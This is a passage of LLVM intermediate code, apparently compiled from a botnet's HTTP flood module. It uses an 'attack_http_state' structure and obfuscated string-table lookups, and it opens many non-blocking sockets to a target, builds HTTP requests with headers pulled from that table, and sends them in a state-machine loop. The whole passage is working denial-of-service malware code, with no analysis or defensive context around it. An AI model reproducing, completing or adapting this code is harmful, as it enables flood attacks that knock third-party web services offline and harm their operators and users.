  %366 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %365) #6, !srcloc !2
  %367 = extractvalue { i64, i64* } %366, 0
  %368 = extractvalue { i64, i64* } %366, 1
  %369 = trunc i64 %367 to i32
  store i32 %369, i32* %30, align 4
  %370 = ptrtoint i64* %368 to i64
  %371 = trunc i64 %370 to i32
  store i32 %371, i32* %31, align 4
  br label %372

; <label>:372:                                    ; preds = %363
  store i32 0, i32* %9, align 4
  br label %373

; <label>:373:                                    ; preds = %944, %372
  %374 = load i32, i32* %9, align 4
  %375 = load i32, i32* %18, align 4
  %376 = icmp slt i32 %374, %375
  br i1 %376, label %377, label %947

; <label>:377:                                    ; preds = %373
  %378 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %379 = load i32, i32* %9, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %378, i64 %380
  store %struct.attack_http_state* %381, %struct.attack_http_state** %26, align 8
  %382 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %383 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %382, i32 0, i32 1
  %384 = load i8, i8* %383, align 4
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 1
  br i1 %386, label %387, label %399

; <label>:387:                                    ; preds = %377
  %388 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %389 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %388, i32 0, i32 12
  %390 = load i32, i32* %389, align 4
  %391 = icmp ne i32 %390, 0
  br i1 %391, label %392, label %395

; <label>:392:                                    ; preds = %387
  %393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %393, i32 0, i32 1
  store i8 4, i8* %394, align 4
  br label %398

; <label>:395:                                    ; preds = %387
  %396 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %396, i32 0, i32 1
  store i8 0, i8* %397, align 4
  br label %398

; <label>:398:                                    ; preds = %395, %392
  br label %399

; <label>:399:                                    ; preds = %398, %377
  %400 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %401 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %400, i32 0, i32 1
  %402 = load i8, i8* %401, align 4
  %403 = zext i8 %402 to i32
  %404 = icmp eq i32 %403, 0
  br i1 %404, label %405, label %485

; <label>:405:                                    ; preds = %399
  %406 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %406, i8 0, i64 16, i32 4, i1 false)
  %407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %407, i32 0, i32 0
  %409 = load i32, i32* %408, align 4
  %410 = icmp ne i32 %409, -1
  br i1 %410, label %411, label %416

; <label>:411:                                    ; preds = %405
  %412 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %412, i32 0, i32 0
  %414 = load i32, i32* %413, align 4
  %415 = call i32 @close(i32 %414)
  br label %416

; <label>:416:                                    ; preds = %411, %405
  %417 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %418 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %418, i32 0, i32 0
  store i32 %417, i32* %419, align 4
  %420 = icmp eq i32 %417, -1
  br i1 %420, label %421, label %422

; <label>:421:                                    ; preds = %416
  br label %944

; <label>:422:                                    ; preds = %416
  %423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %423, i32 0, i32 0
  %425 = load i32, i32* %424, align 4
  %426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 4
  %429 = call i32 (i32, i32, ...) @fcntl(i32 %428, i32 3, i32 0)
  %430 = or i32 2048, %429
  %431 = call i32 (i32, i32, ...) @fcntl(i32 %425, i32 4, i32 %430)
  store i32 65535, i32* %10, align 4
  %432 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 4
  %435 = bitcast i32* %10 to i8*
  %436 = call i32 @setsockopt(i32 %434, i32 0, i32 8, i8* %435, i32 4) #6
  %437 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %437, align 4
  %438 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %438, i32 0, i32 4
  %440 = load i32, i32* %439, align 4
  %441 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %442 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %441, i32 0, i32 0
  store i32 %440, i32* %442, align 4
  %443 = load i16, i16* %19, align 2
  %444 = call zeroext i16 @htons(i16 zeroext %443) #7
  %445 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %444, i16* %445, align 2
  %446 = load i32, i32* %27, align 4
  %447 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %448 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %447, i32 0, i32 2
  store i32 %446, i32* %448, align 4
  %449 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %450 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %449, i32 0, i32 1
  store i8 2, i8* %450, align 4
  %451 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %452 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %451, i32 0, i32 0
  %453 = load i32, i32* %452, align 4
  %454 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %455 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %455, %struct.sockaddr** %454, align 8
  %456 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %457 = load %struct.sockaddr*, %struct.sockaddr** %456, align 8
  %458 = call i32 @connect(i32 %453, %struct.sockaddr* %457, i32 16)
  %459 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %460 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %459, i32 0, i32 0
  %461 = load i32, i32* %460, align 4
  %462 = srem i32 %461, 64
  %463 = zext i32 %462 to i64
  %464 = shl i64 1, %463
  %465 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %466 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 4
  %469 = sdiv i32 %468, 64
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds [16 x i64], [16 x i64]* %465, i64 0, i64 %470
  %472 = load i64, i64* %471, align 8
  %473 = or i64 %472, %464
  store i64 %473, i64* %471, align 8
  %474 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %475 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %474, i32 0, i32 0
  %476 = load i32, i32* %475, align 4
  %477 = load i32, i32* %23, align 4
  %478 = icmp sgt i32 %476, %477
  br i1 %478, label %479, label %484

; <label>:479:                                    ; preds = %422
  %480 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %481 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 4
  %483 = add nsw i32 %482, 1
  store i32 %483, i32* %23, align 4
  br label %484

; <label>:484:                                    ; preds = %479, %422
  br label %943

; <label>:485:                                    ; preds = %399
  %486 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %487 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %486, i32 0, i32 1
  %488 = load i8, i8* %487, align 4
  %489 = zext i8 %488 to i32
  %490 = icmp eq i32 %489, 2
  br i1 %490, label %491, label %534

; <label>:491:                                    ; preds = %485
  %492 = load i32, i32* %27, align 4
  %493 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %494 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %493, i32 0, i32 2
  %495 = load i32, i32* %494, align 4
  %496 = sub i32 %492, %495
  %497 = icmp ugt i32 %496, 30
  br i1 %497, label %498, label %507

; <label>:498:                                    ; preds = %491
  %499 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %500 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %499, i32 0, i32 1
  store i8 0, i8* %500, align 4
  %501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %501, i32 0, i32 0
  %503 = load i32, i32* %502, align 4
  %504 = call i32 @close(i32 %503)
  %505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %505, i32 0, i32 0
  store i32 -1, i32* %506, align 4
  br label %944

; <label>:507:                                    ; preds = %491
  %508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %508, i32 0, i32 0
  %510 = load i32, i32* %509, align 4
  %511 = srem i32 %510, 64
  %512 = zext i32 %511 to i64
  %513 = shl i64 1, %512
  %514 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %515 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %516 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %515, i32 0, i32 0
  %517 = load i32, i32* %516, align 4
  %518 = sdiv i32 %517, 64
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds [16 x i64], [16 x i64]* %514, i64 0, i64 %519
  %521 = load i64, i64* %520, align 8
  %522 = or i64 %521, %513
  store i64 %522, i64* %520, align 8
  %523 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %524 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %523, i32 0, i32 0
  %525 = load i32, i32* %524, align 4
  %526 = load i32, i32* %23, align 4
  %527 = icmp sgt i32 %525, %526
  br i1 %527, label %528, label %533

; <label>:528:                                    ; preds = %507
  %529 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %529, i32 0, i32 0
  %531 = load i32, i32* %530, align 4
  %532 = add nsw i32 %531, 1
  store i32 %532, i32* %23, align 4
  br label %533

; <label>:533:                                    ; preds = %528, %507
  br label %942

; <label>:534:                                    ; preds = %485
  %535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %535, i32 0, i32 1
  %537 = load i8, i8* %536, align 4
  %538 = zext i8 %537 to i32
  %539 = icmp eq i32 %538, 4
  br i1 %539, label %540, label %814

; <label>:540:                                    ; preds = %534
  %541 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %542 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %541, i32 0, i32 14
  store i32 -1, i32* %542, align 4
  %543 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %544 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %543, i32 0, i32 11
  store i32 0, i32* %544, align 4
  %545 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %546 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %545, i32 0, i32 18
  %547 = getelementptr inbounds [1024 x i8], [1024 x i8]* %546, i32 0, i32 0
  call void @util_zero(i8* %547, i32 1024)
  %548 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %549 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %548, i32 0, i32 17
  store i32 0, i32* %549, align 4
  %550 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %550, i32 10240)
  %551 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %552 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %553 = call i32 @util_strlen(i8* %552)
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds i8, i8* %551, i64 %554
  %556 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %556, i32 0, i32 9
  %558 = getelementptr inbounds [9 x i8], [9 x i8]* %557, i32 0, i32 0
  %559 = call i32 @util_strcpy(i8* %555, i8* %558)
  %560 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %561 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %562 = call i32 @util_strlen(i8* %561)
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds i8, i8* %560, i64 %563
  %565 = call i32 @util_strcpy(i8* %564, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %566 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %567 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %568 = call i32 @util_strlen(i8* %567)
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds i8, i8* %566, i64 %569
  %571 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %571, i32 0, i32 6
  %573 = getelementptr inbounds [257 x i8], [257 x i8]* %572, i32 0, i32 0
  %574 = call i32 @util_strcpy(i8* %570, i8* %573)
  %575 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %576 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %577 = call i32 @util_strlen(i8* %576)
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds i8, i8* %575, i64 %578
  %580 = call i32 @util_strcpy(i8* %579, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %581 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %582 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %583 = call i32 @util_strlen(i8* %582)
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds i8, i8* %581, i64 %584
  %586 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %587 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %586, i32 0, i32 5
  %588 = getelementptr inbounds [512 x i8], [512 x i8]* %587, i32 0, i32 0
  %589 = call i32 @util_strcpy(i8* %585, i8* %588)
  %590 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %591 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %592 = call i32 @util_strlen(i8* %591)
  %593 = sext i32 %592 to i64
  %594 = getelementptr inbounds i8, i8* %590, i64 %593
  %595 = call i32 @util_strcpy(i8* %594, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %596 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %597 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %598 = call i32 @util_strlen(i8* %597)
  %599 = sext i32 %598 to i64
  %600 = getelementptr inbounds i8, i8* %596, i64 %599
  %601 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %602 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %601, i32 0, i32 7
  %603 = getelementptr inbounds [129 x i8], [129 x i8]* %602, i32 0, i32 0
  %604 = call i32 @util_strcpy(i8* %600, i8* %603)
  %605 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %606 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %607 = call i32 @util_strlen(i8* %606)
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds i8, i8* %605, i64 %608
  %610 = call i32 @util_strcpy(i8* %609, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 48)
  %611 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %612 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %613 = call i32 @util_strlen(i8* %612)
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds i8, i8* %611, i64 %614
  %616 = call i8* @table_retrieve_val(i32 48, i32* null)
  %617 = call i32 @util_strcpy(i8* %615, i8* %616)
  call void @table_lock_val(i8 zeroext 48)
  %618 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %619 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %620 = call i32 @util_strlen(i8* %619)
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds i8, i8* %618, i64 %621
  %623 = call i32 @util_strcpy(i8* %622, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 49)
  %624 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %625 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %626 = call i32 @util_strlen(i8* %625)
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds i8, i8* %624, i64 %627
  %629 = call i8* @table_retrieve_val(i32 49, i32* null)
  %630 = call i32 @util_strcpy(i8* %628, i8* %629)
  call void @table_lock_val(i8 zeroext 49)
  %631 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %632 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %633 = call i32 @util_strlen(i8* %632)
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds i8, i8* %631, i64 %634
  %636 = call i32 @util_strcpy(i8* %635, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 50)
  %637 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %638 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %639 = call i32 @util_strlen(i8* %638)
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds i8, i8* %637, i64 %640
  %642 = call i8* @table_retrieve_val(i32 50, i32* null)
  %643 = call i32 @util_strcpy(i8* %641, i8* %642)
  call void @table_lock_val(i8 zeroext 50)
  %644 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %645 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %646 = call i32 @util_strlen(i8* %645)
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds i8, i8* %644, i64 %647
  %649 = call i32 @util_strcpy(i8* %648, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %650 = load i8*, i8** %14, align 8
  %651 = icmp ne i8* %650, null
  br i1 %651, label %652, label %693

; <label>:652:                                    ; preds = %540
  call void @table_unlock_val(i8 zeroext 51)
  %653 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %654 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %655 = call i32 @util_strlen(i8* %654)
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds i8, i8* %653, i64 %656
  %658 = call i8* @table_retrieve_val(i32 51, i32* null)
  %659 = call i32 @util_strcpy(i8* %657, i8* %658)
  call void @table_lock_val(i8 zeroext 51)
  %660 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %661 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %662 = call i32 @util_strlen(i8* %661)
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds i8, i8* %660, i64 %663
  %665 = call i32 @util_strcpy(i8* %664, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %666 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %667 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %668 = call i32 @util_strlen(i8* %667)
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds i8, i8* %666, i64 %669
  %671 = call i8* @table_retrieve_val(i32 56, i32* null)
  %672 = call i32 @util_strcpy(i8* %670, i8* %671)
  %673 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %674 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %675 = call i32 @util_strlen(i8* %674)
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds i8, i8* %673, i64 %676
  %678 = call i32 @util_strcpy(i8* %677, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %679 = load i8*, i8** %14, align 8
  %680 = call i32 @util_strlen(i8* %679)
  %681 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %682 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %683 = call i32 @util_strlen(i8* %682)
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds i8, i8* %681, i64 %684
  %686 = call i8* @util_itoa(i32 %680, i32 10, i8* %685)
  %687 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %688 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %689 = call i32 @util_strlen(i8* %688)
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds i8, i8* %687, i64 %690
  %692 = call i32 @util_strcpy(i8* %691, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %693

; <label>:693:                                    ; preds = %652, %540
  %694 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %695 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %694, i32 0, i32 15
  %696 = load i32, i32* %695, align 4
  %697 = icmp sgt i32 %696, 0
  br i1 %697, label %698, label %740

; <label>:698:                                    ; preds = %693
  %699 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %700 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %701 = call i32 @util_strlen(i8* %700)
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds i8, i8* %699, i64 %702
  %704 = call i32 @util_strcpy(i8* %703, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %705

; <label>:705:                                    ; preds = %730, %698
  %706 = load i32, i32* %10, align 4
  %707 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %708 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %707, i32 0, i32 15
  %709 = load i32, i32* %708, align 4
  %710 = icmp slt i32 %706, %709
  br i1 %710, label %711, label %733

; <label>:711:                                    ; preds = %705
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %713 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %714 = call i32 @util_strlen(i8* %713)
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds i8, i8* %712, i64 %715
  %717 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %718 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %717, i32 0, i32 16
  %719 = load i32, i32* %10, align 4
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %718, i64 0, i64 %720
  %722 = getelementptr inbounds [128 x i8], [128 x i8]* %721, i32 0, i32 0
  %723 = call i32 @util_strcpy(i8* %716, i8* %722)
  %724 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %725 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %726 = call i32 @util_strlen(i8* %725)
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds i8, i8* %724, i64 %727
  %729 = call i32 @util_strcpy(i8* %728, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %730

; <label>:730:                                    ; preds = %711
  %731 = load i32, i32* %10, align 4
  %732 = add nsw i32 %731, 1
  store i32 %732, i32* %10, align 4
  br label %705

; <label>:733:                                    ; preds = %705
  %734 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %735 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %736 = call i32 @util_strlen(i8* %735)
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds i8, i8* %734, i64 %737
  %739 = call i32 @util_strcpy(i8* %738, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %740

; <label>:740:                                    ; preds = %733, %693
  %741 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %742 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %743 = call i32 @util_strlen(i8* %742)
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds i8, i8* %741, i64 %744
  %746 = call i32 @util_strcpy(i8* %745, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %747 = load i8*, i8** %14, align 8
  %748 = icmp ne i8* %747, null
  br i1 %748, label %749, label %757

; <label>:749:                                    ; preds = %740
  %750 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %751 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %752 = call i32 @util_strlen(i8* %751)
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds i8, i8* %750, i64 %753
  %755 = load i8*, i8** %14, align 8
  %756 = call i32 @util_strcpy(i8* %754, i8* %755)
  br label %757

; <label>:757:                                    ; preds = %749, %740
  %758 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %759 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %758, i32 0, i32 9
  %760 = getelementptr inbounds [9 x i8], [9 x i8]* %759, i32 0, i32 0
  %761 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %762 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %761, i32 0, i32 10
  %763 = getelementptr inbounds [9 x i8], [9 x i8]* %762, i32 0, i32 0
  %764 = call signext i8 @util_strcmp(i8* %760, i8* %763)
  %765 = icmp ne i8 %764, 0
  br i1 %765, label %774, label %766

; <label>:766:                                    ; preds = %757
  %767 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %768 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %767, i32 0, i32 9
  %769 = getelementptr inbounds [9 x i8], [9 x i8]* %768, i32 0, i32 0
  %770 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %771 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %770, i32 0, i32 10
  %772 = getelementptr inbounds [9 x i8], [9 x i8]* %771, i32 0, i32 0
  %773 = call i32 @util_strcpy(i8* %769, i8* %772)
  br label %774

; <label>:774:                                    ; preds = %766, %757
  %775 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %776 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %775, i32 0, i32 0
  %777 = load i32, i32* %776, align 4
  %778 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %779 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %780 = call i32 @util_strlen(i8* %779)
  %781 = sext i32 %780 to i64
  %782 = call i64 @send(i32 %777, i8* %778, i64 %781, i32 16384)
  %783 = load i32, i32* %27, align 4
  %784 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %785 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %784, i32 0, i32 3
  store i32 %783, i32* %785, align 4
  %786 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %787 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %786, i32 0, i32 1
  store i8 6, i8* %787, align 4
  %788 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %789 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %788, i32 0, i32 0
  %790 = load i32, i32* %789, align 4
  %791 = srem i32 %790, 64
  %792 = zext i32 %791 to i64
  %793 = shl i64 1, %792
  %794 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
